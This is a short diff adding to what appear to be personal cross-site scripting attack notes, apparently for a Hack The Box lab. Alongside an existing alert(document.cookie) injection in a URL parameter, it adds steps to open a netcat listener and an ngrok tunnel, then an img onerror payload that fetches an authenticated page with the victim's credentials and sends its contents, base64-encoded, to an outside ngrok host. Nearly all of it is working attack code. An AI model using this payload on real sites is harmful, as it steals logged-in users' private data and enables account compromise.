@@ -96,3 +96,10 @@
                     1. [https://myapp.com/account.php?page_id=”](https://myapp.com/account.php?page_id=%E2%80%9D)><script>/_&seed=_/alert(document .cookie);/_&mode=_/</script>
     4. Change request method
 
+
+fetch data via nc listener and ngrok listener 
+sudo nv -lvnp 4443
+ngrok http http://localhost:4443
+
+then xss=> 
+<img src=0 onerror="fetch('https://xssintro.htb/view.php',{credentials:'include'}).then(r=>r.text()).then(d=>fetch('https://nonrecalcitrant-euphorbiaceous-fredrick.ngrok-free.dev/?d='+btoa(d),{headers:{'ngrok-skip-browser-warning':'1'}}))">
